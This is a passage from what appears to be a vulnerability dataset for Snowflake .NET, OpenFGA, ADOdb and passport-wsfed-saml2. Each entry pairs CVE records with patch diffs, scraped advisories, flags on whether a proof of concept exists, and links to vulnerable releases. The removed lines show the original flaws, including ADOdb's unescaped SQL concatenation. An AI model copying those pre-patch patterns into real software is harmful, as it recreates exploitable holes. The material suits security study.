Snowflake.Data/Configuration/EasyLoggingConfigParser.cs:\n```\n@@ -1,10 +1,12 @@\nusing System;\n using System.Collections.Generic;\n-using System.IO;\n using System.Linq;\n using System.Reflection;\n+using Mono.Unix;\n+using System.Security;\n using Newtonsoft.Json;\n using Newtonsoft.Json.Linq;\n+using Snowflake.Data.Core.Tools;\n using Snowflake.Data.Log;\n \n namespace Snowflake.Data.Configuration\n\n@@ -13,7 +15,16 @@\ninternal class EasyLoggingConfigParser\n     {\n         private static readonly SFLogger s_logger = SFLoggerFactory.GetLogger<EasyLoggingConfigParser>();\n \n-        public static readonly EasyLoggingConfigParser Instance = new EasyLoggingConfigParser();\n+        private readonly UnixOperations _unixOperations;\n+\n+        public static readonly EasyLoggingConfigParser Instance = new EasyLoggingConfigParser(UnixOperations.Instance);\n+\n+        internal EasyLoggingConfigParser(UnixOperations unixOperations)\n+        {\n+            _unixOperations = unixOperations;\n+        }\n+\n+        internal EasyLoggingConfigParser() : this(UnixOperations.Instance) { }\n \n         public virtual ClientConfig Parse(string filePath)\n         {\n\n@@ -29,11 +40,11 @@\nprivate string TryToReadFile(string filePath)\n             }\n             try\n             {\n-                return File.ReadAllText(filePath);\n+                return FileOperations.Instance.ReadAllText(filePath, CheckIfValidPermissions);\n             }\n             catch (Exception e)\n             {\n-                var errorMessage = \"Finding easy logging configuration failed\";\n+                var errorMessage = $\"Finding easy logging configuration failed: {e.Message}\";\n                 s_logger.Error(errorMessage, e);\n                 throw new Exception(errorMessage);\n             }\n\n@@ -76,5 +87,32 @@\nprivate void CheckForUnknownFields(string fileContent)\n                 .ToList()\n                 .ForEach(unknownKey => s_logger.Warn($\"Unknown field from config: {unknownKey.Name}\"));\n         }\n+\n+        private void CheckIfValidPermissions(UnixStream stream)\n+        {\n+            // Check user ownership of file\n+            if (stream.OwnerUserId != _unixOperations.GetCurrentUserId())\n+            {\n+                var errorMessage = $\"Error due to user not having ownership of the config file\";\n+                s_logger.Error(errorMessage);\n+                throw new SecurityException(errorMessage);\n+            }\n+\n+            // Check group ownership of file\n+            if (stream.OwnerGroupId != _unixOperations.GetCurrentGroupId())\n+            {\n+                var errorMessage = $\"Error due to group not having ownership of the config file\";\n+                s_logger.Error(errorMessage);\n+                throw new SecurityException(errorMessage);\n+            }\n+\n+            // Check if others have permissions to modify the file and fail if so\n+            if (_unixOperations.CheckFileHasAnyOfPermissions(stream.FileAccessPermissions, FileAccessPermissions.GroupWrite | FileAccessPermissions.OtherWrite))\n+            {\n+                var errorMessage = $\"Error due to other users having permission to modify the config file\";\n+                s_logger.Error(errorMessage);\n+                throw new SecurityException(errorMessage);\n+            }\n+        }\n     }\n }\n```\n\nFilename: Snowflake.Data/Core/Tools/FileOperations.cs:\n```\n@@ -96,7 +96,8 @@\npublic virtual bool IsFileSafe(string path)\n                 return true;\n             }\n \n-            if (_unixOperations.CheckFileHasAnyOfPermissions(path, NotSafePermissions))\n+            var fileInfo = new UnixFileInfo(path);\n+            if (_unixOperations.CheckFileHasAnyOfPermissions(fileInfo.FileAccessPermissions, NotSafePermissions))\n             {\n                 s_logger.Warn($\"File '{path}' permissions are too broad. It could be potentially accessed by group or others.\");\n                 return false;\n```\n\nFilename: Snowflake.Data/Core/Tools/UnixOperations.cs:\n```\n@@ -1,6 +1,5 @@\nusing System;\n using System.IO;\n-\n using System.Text;\n using Mono.Unix;\n using Mono.Unix.Native;\n\n@@ -85,10 +84,9 @@\npublic virtual DirectoryUnixInformation GetDirectoryInfo(string path)\n \n         public virtual long ChangePermissions(string path, FileAccessPermissions permissions) => Syscall.chmod(path, (FilePermissions) permissions);\n \n-        public virtual bool CheckFileHasAnyOfPermissions(string path, FileAccessPermissions permissions)\n+        public virtual bool CheckFileHasAnyOfPermissions(FileAccessPermissions actualPermissions , FileAccessPermissions expectedPermissions)\n         {\n-            var fileInfo = new UnixFileInfo(path);\n-            return (permissions & fileInfo.FileAccessPermissions) != 0;\n+            return (expectedPermissions & actualPermissions ) != 0;\n         }\n \n         public virtual bool CheckDirectoryHasAnyOfPermissions(string path, FileAccessPermissions permissions)\n```",
                "url": "https://github.com/snowflakedb/snowflake-connector-net/commit/393aad3cfa81045a05dd488944db45256e861bff"
            }
        ],
        "published_date": "2025-04-28T22:33:01.627Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nsnowflakedb\n/\nsnowflake-connector-net\nPublic\nNotifications You must be signed in to change notification settings\nFork 147\nStar 189\nCode\nIssues\n28\nPull requests\n30\nActions\nSecurity\n4\nInsights\nAdditional navigation options\nRace condition when checking access to Easy Logging configuration file\nLow sfc-gh-knozderko published GHSA-c82r-c9f7-f5mj 3 weeks agoApr 28, 2025\nPackage\nnuget Snowflake.Data\n(\nNuGet\n)\nAffected versions\n>= 2.1.2, <= 4.4.0\nPatched versions\n4.4.1\nDescription\nIssue\nSnowflake discovered and remediated a vulnerability in the Snowflake Connector for .NET (\u201cConnector\u201d). When using the Easy Logging feature on Linux and macOS, the Connector didn\u2019t correctly verify the permissions of the logging configuration file, potentially allowing an attacker with local access to overwrite the configuration and gain control over logging level and output location.\nThis vulnerability affects Connector versions 2.1.2 through 4.4.0. Snowflake fixed the issue in version 4.4.1.\nVulnerability Details\nWhen using the Easy Logging feature on Linux and macOS, the Connector reads logging configuration from a user-provided file. On Linux and macOS, the Connector verifies that the configuration file can be written to only by its owner. That check was vulnerable to a Time-of-Check to Time-of-Use (TOCTOU) race condition and failed to verify that the file owner matches the user running the Connector. This could allow a local attacker with write access to the configuration file or the directory containing it to overwrite the configuration and gain control over logging level and output location.\nSolution\nSnowflake released version 4.4.1 of the Snowflake Connector for .NET, which fixes this issue. We recommend users upgrade to version 4.4.1.\nAdditional Information\nIf you discover a security vulnerability in one of our products or websites, please report the issue to Snowflake through our Vulnerability Disclosure Program hosted at HackerOne. For more information, please see our Vulnerability Disclosure Policy.\nSeverity\nLow\n3.3\n/ 10\nCVSS v3 base metrics\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N\nCVE ID\nCVE-2025-46326\nWeaknesses\nCWE-367\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory describes the vulnerability, its impact, the versions affected, and the solution. However, it does not include a proof of concept or detailed steps to reproduce the vulnerability.",
                "url": "https://github.com/snowflakedb/snowflake-connector-net/security/advisories/GHSA-c82r-c9f7-f5mj"
            }
        ],
        "sw_version": "v2.1.2",
        "sw_version_wget": "https://github.com/snowflakedb/snowflake-connector-net/archive/refs/tags/v2.1.2.zip"
    },
    "CVE-2025-46331": {
        "cwe": [
            {
                "id": "CWE-284",
                "value": "CWE-284: Improper Access Control"
            }
        ],
        "description": "OpenFGA is a high-performance and flexible authorization/permission engine built for developers and inspired by Google Zanzibar. OpenFGA v1.8.10 to v1.3.6 (Helm chart <= openfga-0.2.28, docker <= v.1.8.10) are vulnerable to authorization bypass when certain Check and ListObject calls are executed. This issue has been patched in version 1.8.11.",
        "languages": [
            "Go"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\n* fix: do not save to check query cache when result indicates cycle\n\nIf the result of CheckResolve indicates tuple cycle, we should not\nsave the result into check query cache because the parent may produce\na different response. This could cause check result to return false\nwhen it should be true.\n\n* update based on code review feedback\n\n* update changelog\n\n* update Changelog as it will be in its own release\n\n* merge in CHANGELOG\n\nFilename: CHANGELOG.md:\n```\n@@ -7,9 +7,16 @@\nand this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0\n Try to keep listed changes to a concise bulleted list of simple explanations of changes. Aim for the amount of information needed so that readers can understand where they would look in the codebase to investigate the changes' implementation, or where they would look in the documentation to understand how to make use of the change in practice - better yet, link directly to the docs and provide detailed information there. Only elaborate if doing so is required to avoid breaking changes or experimental features from ruining someone's day.\n \n ## [Unreleased]\n+\n+## [1.8.11] - 2025-04-29\n+[Full changelog](https://github.com/openfga/openfga/compare/v1.8.10...v1.8.11)\n+\n ### Changed\n - Update go version to 1.24.2 [#2404](https://github.com/openfga/openfga/pull/2404)\n \n+### Fixed\n+- Do not save to check query cache when result indicates cycle. [CVE-2025-46331](https://github.com/openfga/openfga/security/advisories/GHSA-w222-m46c-mgh6)\n+\n ## [1.8.10] - 2025-04-28\n [Full changelog](https://github.com/openfga/openfga/compare/v1.8.9...v1.8.10)\n\n@@ -1266,7 +1273,8 @@\nRe-release of `v0.3.5` because the go module proxy cached a prior commit of the\n - Memory storage adapter implementation\n - Early support for preshared key or OIDC authentication methods\n \n-[Unreleased]: https://github.com/openfga/openfga/compare/v1.8.10...HEAD\n+[Unreleased]: https://github.com/openfga/openfga/compare/v1.8.11...HEAD\n+[1.8.11]: https://github.com/openfga/openfga/compare/v1.8.10...v1.8.11\n [1.8.10]: https://github.com/openfga/openfga/compare/v1.8.9...v1.8.10\n [1.8.9]: https://github.com/openfga/openfga/compare/v1.8.8...v1.8.9\n [1.8.8]: https://github.com/openfga/openfga/compare/v1.8.7...v1.8.8\n```\n\nFilename: internal/graph/cached_resolver.go:\n```\n@@ -187,6 +187,18 @@\nfunc (c *CachedCheckResolver) ResolveCheck(\n \t\treturn nil, err\n \t}\n \n+\t// when the response indicates cycle detected. The result is indeterminate because the\n+\t// parent of the cycle could have resolved to true. Thus, we don't save the result and let\n+\t// the parent handle it.\n+\tif resp.GetCycleDetected() {\n+\t\tspan.SetAttributes(attribute.Bool(\"cycle_detected\", true))\n+\t\tc.logger.Debug(\"CachedCheckResolver not saving to cache due to cycle\",\n+\t\t\tzap.String(\"store_id\", req.GetStoreID()),\n+\t\t\tzap.String(\"authorization_model_id\", req.GetAuthorizationModelID()),\n+\t\t\tzap.String(\"tuple_key\", req.GetTupleKey().String()))\n+\t\treturn resp, nil\n+\t}\n+\n \tclonedResp := resp.clone()\n \n \tc.cache.Set(cacheKey, &CheckResponseCacheEntry{LastModified: time.Now(), CheckResponse: clonedResp}, c.cacheTTL)\n```\n\nFilename: internal/graph/cached_resolver_test.go:\n```\n@@ -634,13 +634,14 @@\nfunc TestCachedCheckResolver_FieldsInResponse(t *testing.T) {\n \t\t\tResolutionMetadata: ResolveCheckResponseMetadata{\n \t\t\t\tCycleDetected: true,\n \t\t\t},\n-\t\t}, nil)\n+\t\t}, nil).Times(2)\n \n \tresp, err := cachedCheckResolver.ResolveCheck(context.Background(), &ResolveCheckRequest{})\n \trequire.NoError(t, err)\n \trequire.NotNil(t, resp)\n \trequire.True(t, resp.GetResolutionMetadata().CycleDetected)\n \n+\t// we expect the underlying resolve check to be called twice because we are not saving the response.\n \tresp, err = cachedCheckResolver.ResolveCheck(context.Background(), &ResolveCheckRequest{})\n \trequire.NoError(t, err)\n \trequire.NotNil(t, resp)\n```",
                "url": "https://github.com/openfga/openfga/commit/244302e7a8b979d66cc1874a3899cdff7d47862f"
            }
        ],
        "published_date": "2025-04-30T18:27:05.921Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nopenfga\n/\nopenfga\nPublic\nNotifications You must be signed in to change notification settings\nFork 263\nStar 3.6k\nCode\nIssues\n120\nPull requests\n25\nActions\nProjects\n1\nSecurity\n15\nInsights\nAdditional navigation options\nOpenFGA Authorization Bypass\nModerate adriantam published GHSA-w222-m46c-mgh6 2 weeks agoApr 30, 2025\nPackage\ngomod github.com/openfga/openfga\n(\nGo\n)\nAffected versions\n>=1.3.6, <1.8.11\nPatched versions\n1.8.11\ndocker openfga/openfga\n(\nDocker\n)\n>=1.3.6, <1.8.11\n1.8.11\nopenfga/openfga\n(Helm Charts)\n>=openfga-0.1.36, <openfga-0.2.29\nopenfga-0.2.29\nDescription\nOverview\nOpenFGA v1.8.10 or previous (Helm chart <= openfga-0.2.28, docker <= v.1.8.10) are vulnerable to authorization bypass when certain Check and ListObject calls are executed.\nAm I Affected?\nIf you are using OpenFGA v1.8.10 or previous, specifically under the following conditions, you are affected by this authorization bypass vulnerability:\nCalling Check API or ListObjects with an authorization model that has tuple cycle.\nCheck query cache is enabled, and\nThere are multiple check / list objects requests involving the tuple cycle within the check query TTL\nFix\nUpgrade to v1.8.11. This upgrade is backwards compatible.\nSeverity\nModerate\n5.8\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nPresent\nPrivileges Required\nLow\nUser interaction\nNone\nVulnerable System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H\nCVE ID\nCVE-2025-46331\nWeaknesses\nNo CWEs\nCredits\navinashs433\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The provided advisory does not contain example payloads or explicit instructions to exploit the vulnerability.",
                "url": "https://github.com/openfga/openfga/security/advisories/GHSA-w222-m46c-mgh6"
            }
        ],
        "sw_version": "v1.3.6",
        "sw_version_wget": "https://github.com/openfga/openfga/archive/refs/tags/v1.3.6.zip"
    },
    "CVE-2025-46337": {
        "cwe": [
            {
                "id": "CWE-89",
                "value": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
            }
        ],
        "description": "ADOdb is a PHP database class library that provides abstractions for performing queries and managing databases. Prior to version 5.22.9, improper escaping of a query parameter may allow an attacker to execute arbitrary SQL statements when the code using ADOdb connects to a PostgreSQL database and calls pg_insert_id() with user-supplied data. This issue has been patched in version 5.22.9.",
        "languages": [
            "PHP"
        ],
        "patch_commits": [
            {
                "content": "Fix SQL injection in pg_insert_id()\n\nProperly escape the $tablename and $fieldname parameters used to build\nthe sequence name.\n\nFilename: drivers/adodb-postgres64.inc.php:\n```\n@@ -138,7 +138,8 @@\nfunction IfNull( $field, $ifNull )\n \t// get the last id - never tested\n \tfunction pg_insert_id($tablename,$fieldname)\n \t{\n-\t\t$result=pg_query($this->_connectionID, 'SELECT last_value FROM '. $tablename .'_'. $fieldname .'_seq');\n+\t\t$sequence = pg_escape_identifier($this->_connectionID, $tablename .'_'. $fieldname .'_seq');\n+\t\t$result = pg_query($this->_connectionID, 'SELECT last_value FROM '. $sequence);\n \t\tif ($result) {\n \t\t\t$arr = @pg_fetch_row($result,0);\n \t\t\tpg_free_result($result);\n```",
                "url": "https://github.com/ADOdb/ADOdb/commit/11107d6d6e5160b62e05dff8a3a2678cf0e3a426"
            }
        ],
        "published_date": "2025-05-01T17:20:10.658Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nADOdb\n/\nADOdb\nPublic\nNotifications You must be signed in to change notification settings\nFork 274\nStar 440\nCode\nIssues\n39\nPull requests\n25\nDiscussions\nActions\nProjects\nSecurity\n2\nInsights\nAdditional navigation options\nSQL injection in ADOdb PostgreSQL driver pg_insert_id() method\nCritical dregad published GHSA-8x27-jwjr-8545 2 weeks agoMay 1, 2025\nPackage\ncomposer adodb/adodb-php\n(\nComposer\n)\nAffected versions\n<=5.22.8\nPatched versions\n5.22.9\nDescription\nImproper escaping of a query parameter may allow an attacker to execute arbitrary SQL statements when the code using ADOdb connects to a PostgreSQL database and calls pg_insert_id() with user-supplied data.\nNote that the indicated Severity corresponds to a worst-case usage scenario.\nImpact\nPostgreSQL drivers (postgres64, postgres7, postgres8, postgres9).\nPatches\nVulnerability is fixed in ADOdb 5.22.9 (11107d6).\nWorkarounds\nOnly pass controlled data to pg_insert_id() method's $fieldname parameter, or escape it with pg_escape_identifier() first.\nReferences\nIssue #1070\nBlog post by Marco Nappi\nCredits\nThanks to Marco Nappi (@mrcnpp) for reporting this vulnerability.\nSeverity\nCritical\n10.0\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L\nCVE ID\nCVE-2025-46337\nWeaknesses\nCWE-89\nCredits\nmrcnpp\nFinder\ndregad\nRemediation developer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory describes the vulnerability and its impact but does not provide explicit proof of concept code or detailed steps for reproduction.",
                "url": "https://github.com/ADOdb/ADOdb/security/advisories/GHSA-8x27-jwjr-8545"
            }
        ],
        "sw_version": "v5.22.8",
        "sw_version_wget": "https://github.com/ADOdb/ADOdb/archive/refs/tags/v5.22.8.zip"
    },
    "CVE-2025-46572": {
        "cwe": [
            {
                "id": "CWE-287",
                "value": "CWE-287: Improper Authentication"
            }
        ],
        "description": "passport-wsfed-saml2 provides passport strategy for both WS-fed and SAML2 protocol. A vulnerability present starting in version 3.0.5 up to and including version 4.6.3 allows an attacker to impersonate any user during SAML authentication by crafting a SAMLResponse. This can be done by using a valid SAML object that was signed by the configured IdP. Users are affected specifically when the service provider is using passport-wsfed-saml2 and a valid SAML document signed by the Identity Provider can be obtained. Version 4.6.4 contains a fix for the vulnerability.",
        "languages": [
            "JavaScript"
        ],
        "patch_commits": [
            {
                "content": "Upgrades (#190)\n\n* Upgrades\n\n* fixes\n\n* fixess\n\nFilename: .eslintignore:\n```\n@@ -0,0 +1,2 @@\n+test\n+examples\n\\ No newline at end of file\n```\n\nFilename: .eslintrc.json:\n```\n@@ -0,0 +1,53 @@\n+{\n+  \"env\": {\n+    \"node\": true,\n+    \"es6\": true,\n+    \"mocha\": true\n+  },\n+  \"parserOptions\": {\n+    \"ecmaVersion\": 2022\n+  },\n+  \"rules\": {\n+    \"no-var\": 2,\n+    \"no-bitwise\": 2,\n+    \"curly\": [\"error\", \"all\"],\n+    \"eqeqeq\": 2,\n+    \"wrap-iife\": [\n+      2,\n+      \"any\"\n+    ],\n+    \"indent\": [\n+      2,\n+      2,\n+      {\n+        \"SwitchCase\": 1\n+      }\n+    ],\n+    \"no-use-before-define\": 2,\n+    \"new-cap\": 2,\n+    \"no-caller\": 2,\n+    \"quotes\": [\n+      2,\n+      \"single\",\n+      \"avoid-escape\"\n+    ],\n+    \"no-undef\": 2,\n+    \"strict\": 0,\n+    \"no-unused-expressions\": 2,\n+    \"no-eval\": 2,\n+    \"dot-notation\": 0,\n+    \"no-unused-vars\": 2,\n+    \"comma-style\": [\n+      2,\n+      \"last\"\n+    ],\n+    \"no-useless-escape\": \"off\",\n+    \"security/detect-non-literal-fs-filename\": \"off\",\n+    \"security/detect-object-injection\": \"off\",\n+    \"security/detect-unsafe-regex\": \"off\",\n+    \"camelcase\": 1\n+  },\n+  \"extends\": [\n+    \"eslint:recommended\"\n+  ]\n+}\n\\ No newline at end of file\n```\n\nFilename: .github/workflows/ci.yml:\n```\n@@ -8,7 +8,7 @@\njobs:\n \n     strategy:\n       matrix:\n-        node-version: [12.x, 14.x, 16.x]\n+        node-version: [18.x, 20.x, 22.x]\n         # See supported Node.js release schedule at https://nodejs.org/en/about/releases/\n \n     steps:\n```\n\nFilename: .jshintrc:\n```\n@@ -1,39 +0,0 @@\n-{\n-  \"camelcase\": false,\n-  \"curly\": false,\n-\n-  \"node\": true,\n-  \"esnext\": true,\n-  \"bitwise\": true,\n-  \"eqeqeq\": true,\n-  \"immed\": true,\n-  \"indent\": 2,\n-  \"latedef\": false,\n-  \"newcap\": true,\n-  \"noarg\": true,\n-  \"regexp\": true,\n-  \"undef\": true,\n-  \"strict\": false,\n-  \"smarttabs\": true,\n-  \"expr\": true,\n-\n-  \"evil\": true,\n-  \"browser\": true,\n-  \"regexdash\": true,\n-  \"wsh\": true,\n-  \"trailing\": true,\n-  \"sub\": true,\n-  \"unused\": true,\n-  \"laxcomma\": true,\n-  \"nonbsp\": true,\n-\n-  \"globals\": {\n-    \"after\": false,\n-    \"before\": false,\n-    \"afterEach\": false,\n-    \"beforeEach\": false,\n-    \"describe\": false,\n-    \"it\": false,\n-    \"escape\": false\n-  }\n-}\n```\n\nFilename: lib/passport-wsfed-saml2/errors/SamlRequestParserError.js:\n```\n@@ -0,0 +1,13 @@\n+function SamlRequestParserError (message, detail, status) {\n+    var err = Error.call(this, message);\n+    err.name = 'SamlRequestParserError';\n+    err.message = message || 'Error parsing SAMLRequest';\n+    err.detail = detail;\n+    err.status = status || 400;\n+    return err;\n+}\n+\n+SamlRequestParserError.prototype = Object.create(Error.prototype);\n+SamlRequestParserError.prototype.constructor = SamlRequestParserError;\n+\n+module.exports = SamlRequestParserError;\n\\ No newline at end of file\n```\n\nFilename: lib/passport-wsfed-saml2/saml.js:\n```\n@@ -1,429 +1,463 @@\n-// credits to: https://github.com/bergie/passport-saml\n-\n-var crypto    = require('crypto');\n-var xpath     = require('xpath');\n-var xmlCrypto = require('xml-crypto');\n-var EventEmitter = require('events');\n+const crypto    = require('crypto');\n+const xpath     = require('xpath');\n+const xmlCrypto = require('xml-crypto');\n+const EventEmitter = require('events');\n const forge = require('node-forge');\n const utils = require('./utils');\n+const xmldom = require('@xmldom/xmldom');\n \n-var ELEMENT_NODE = 1;\n+const ELEMENT_NODE = 1;\n \n-var SAML = function (options) {\n-  this.options = options || {};\n+const domParser = new xmldom.DOMParser();\n \n-  if (this.options.thumbprint) {\n-    this.options.thumbprints = (this.options.thumbprints || []).concat([this.options.thumbprint]);\n+const getAuthContext20 = (samlAssertion) => {\n+  const authnContext = xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='AuthnStatement']/*[local-name(.)='AuthnContext']/*[local-name(.)='AuthnContextClassRef']\", samlAssertion);\n+  if (authnContext.length === 0) {\n+    return;\n   }\n+  return authnContext[0].textContent;\n+};\n \n-  if (!this.options.cert && (!this.options.thumbprints || this.options.thumbprints.length === 0)) {\n-    throw new Error('You should set either a base64 encoded certificate or the thumbprints of the signing certificates');\n+const getAttributeValues = (attribute) => {\n+  if (!attribute || attribute.childNodes.length === 0) {\n+    return;\n+  }\n+  const attributeValues = [];\n+  for (let i = 0; i < attribute.childNodes.length; i++) {\n+    if (attribute.childNodes[i].nodeType !== ELEMENT_NODE) {\n+      continue;\n+    }\n+    attributeValues.push(attribute.childNodes[i].textContent);\n   }\n \n-  this.options.checkExpiration = (typeof this.options.checkExpiration !== 'undefined') ? this.options.checkExpiration : true;\n-  // Note! It would be best to set this to true. But it's defaulting to false so as not to break login for expired certs.\n-  this.options.checkCertExpiration = (typeof this.options.checkCertExpiration !== 'undefined') ? this.options.checkCertExpiration : false;\n-  //clockskew in minutes\n-  this.options.clockSkew = (typeof this.options.clockSkew === 'number' && this.options.clockSkew >= 0) ? this.options.clockSkew : 3;\n-  this.options.checkAudience = (typeof this.options.checkAudience !== 'undefined') ? this.options.checkAudience : true;\n-  this.options.checkRecipient = (typeof this.options.checkRecipient !== 'undefined') ? this.options.checkRecipient : true;\n-  this.options.checkNameQualifier = (typeof this.options.checkNameQualifier !== 'undefined') ? this.options.checkNameQualifier : true;\n-  this.options.checkSPNameQualifier = (typeof this.options.checkSPNameQualifier !== 'undefined') ? this.options.checkSPNameQualifier : true;\n-  this.eventEmitter = this.options.eventEmitter || new EventEmitter();\n+  if (attributeValues.length === 1) {\n+    return attributeValues[0];\n+  }\n+\n+  return attributeValues;\n };\n \n-SAML.prototype.validateSignature = function (xml, options, callback) {\n-  var self = this;\n-  xml = utils.parseSamlResponse(xml);\n+const getSessionIndex = (samlAssertion) => {\n+  const authnStatement = xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='AuthnStatement']\", samlAssertion);\n+  const sessionIndex = authnStatement.length > 0 && authnStatement[0].attributes.length > 0 ?\n+      authnStatement[0].getAttribute('SessionIndex') : undefined;\n+  return sessionIndex || undefined;\n+};\n \n-  var signaturePath = this.options.signaturePath || options.signaturePath;\n-  var signatures = xpath.select(signaturePath, xml);\n-  if (signatures.length === 0) {\n-    return callback(new Error('Signature is missing (xpath: ' + signaturePath + ')'));\n-  } else if (signatures.length > 1) {\n-    return callback(new Error('Signature was found more than one time (xpath: ' + signaturePath + ')'));\n-  }\n-  var signature = signatures[0];\n-\n-  var sig = new xmlCrypto.SignedXml(null, { idAttribute: 'AssertionID' });\n-  sig.keyInfoProvider = {\n-    getKeyInfo: function (key) {\n-      return \"<X509Data></X509Data>\";\n-    },\n-    getKey: function (keyInfo) {\n-\n-      //If there's no embedded signing cert, use the configured cert through options\n-      if(!keyInfo || keyInfo.length===0){\n-        if(!options.cert) throw new Error('options.cert must be specified for SAMLResponses with no embedded signing certificate');\n-        return utils.certToPEM(options.cert);\n-      }\n+const getAttributes = (samlAssertion) => {\n+  return xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='AttributeStatement']/*[local-name(.)='Attribute']\", samlAssertion);\n+};\n \n-      //If there's an embedded signature and thumprints are provided check that\n-      if (options.thumbprints && options.thumbprints.length > 0)  {\n-        var embeddedSignature = keyInfo[0].getElementsByTagNameNS(\"http://www.w3.org/2000/09/xmldsig#\", \"X509Certificate\");\n-        if (embeddedSignature.length > 0) {\n-          var base64cer = embeddedSignature[0].firstChild.toString();\n-          var shasum = crypto.createHash('sha1');\n-          var der = new Buffer(base64cer, 'base64').toString('binary');\n-          shasum.update(der, 'latin1');\n-          self.calculatedThumbprint = shasum.digest('hex');\n-\n-          // using embedded cert, so options.cert is not used anymore\n-          delete options.cert;\n-          return utils.certToPEM(base64cer);\n-        }\n-      }\n+const getNameID11 = (samlAssertion) => {\n+  let nameId = xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='AuthenticationStatement']/*[local-name(.)='Subject']/*[local-name(.)='NameIdentifier']\", samlAssertion);\n \n-      // If there's an embedded signature, but no thumprints are supplied, use options.cert\n-      // either options.cert or options.thumbprints must be specified so at this point there\n-      // must be an options.cert\n-      return utils.certToPEM(options.cert);\n+  if (nameId.length === 0) {\n+    // only for backward compatibility with adfs\n+    nameId = xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='AttributeStatement']/*[local-name(.)='Subject']/*[local-name(.)='NameIdentifier']\", samlAssertion);\n+    if (nameId.length === 0) {\n+      return;\n     }\n-  };\n+  }\n \n-  var valid;\n+  return nameId[0].textContent;\n+};\n \n-  try {\n-    sig.loadSignature(signature);\n-    valid = sig.checkSignature(xml.toString());\n+const getNameID20 = (samlAssertion) => {\n+  const nameId = xpath.select(\"//*[local-name(.)='Assertion'][1]/*[local-name(.)='Subject']/*[local-name(.)='NameID']\", samlAssertion);\n+  if (nameId.length === 0) {\n+    return;\n+  }\n+  const element = nameId[0];\n+  const result = {\n+    value: element.textContent,\n+  };\n \n-    if (!self.extractAndValidateCertExpiration(xml, options.cert) && self.options.checkCertExpiration) {\n-      return callback(new Error('The signing certificate is not currently valid.'), null);\n-    }\n-  } catch (e) {\n-    if (e.message === 'PEM_read_bio_PUBKEY failed') {\n-      return callback(new Error('The signing certificate is invalid (' + e.message + ')'));\n+  [\n+    'NameQualifier',\n+    'SPNameQualifier',\n+    'Format',\n+    'SPProvidedID'\n+  ].forEach(function(key) {\n+    const value = element.getAttribute(key);\n+    if (!value) {\n+      return;\n     }\n-    if (e.opensslErrorStack !== undefined) {\n-      const err = new Error(`The signing certificate is invalid (${e.opensslErrorStack.join(', ')})`);\n-      err.originalError = e;\n+    result[key] = element.getAttribute(key);\n+  });\n \n-      return callback(err);\n-    }\n+  return result;\n+};\n \n-    return callback(e);\n-  }\n+function getKeyFn(options) {\n+  return function (keyInfo) {\n+    //If there's no embedded signing cert, use the configured cert through options\n+    if (!keyInfo || keyInfo.length === 0 ){\n+      if (!options.cert) {\n+        throw new Error('options.cert must be specified for SAMLResponses with no embedded signing certificate');\n+      }\n+      return utils.certToPEM(options.cert);\n+    }\n \n-  if (!valid) {\n-    return callback(new Error('Signature check errors: ' + sig.validationErrors));\n-  }\n+    //If there's an embedded signature and thumbprints are provided check that\n+    if (options.thumbprints && options.thumbprints.length > 0)  {\n+      const embeddedSignature = keyInfo.getElementsByTagNameNS('http://www.w3.org/2000/09/xmldsig#', 'X509Certificate');\n+      if (embeddedSignature.length > 0) {\n+        const base64cer = embeddedSignature[0].firstChild.toString();\n+        const shasum = crypto.createHash('sha1');\n+        const der = new Buffer(base64cer, 'base64').toString('binary');\n+        shasum.update(der, 'latin1');\n+        const calculatedThumbprint = shasum.digest('hex').toUpperCase();\n+        const validThumbprint = options.thumbprints.some(function (thumbprint) {\n+          return calculatedThumbprint === thumbprint.toUpperCase();\n+        });\n+\n+        if (!validThumbprint) {\n+          throw new Error('Invalid thumbprint (configured: ' + options.thumbprints.join(', ').toUpperCase() + '. calculated: ' + calculatedThumbprint + ')' );\n+        }\n+        // using embedded cert, so options.cert is not used anymore\n+        delete 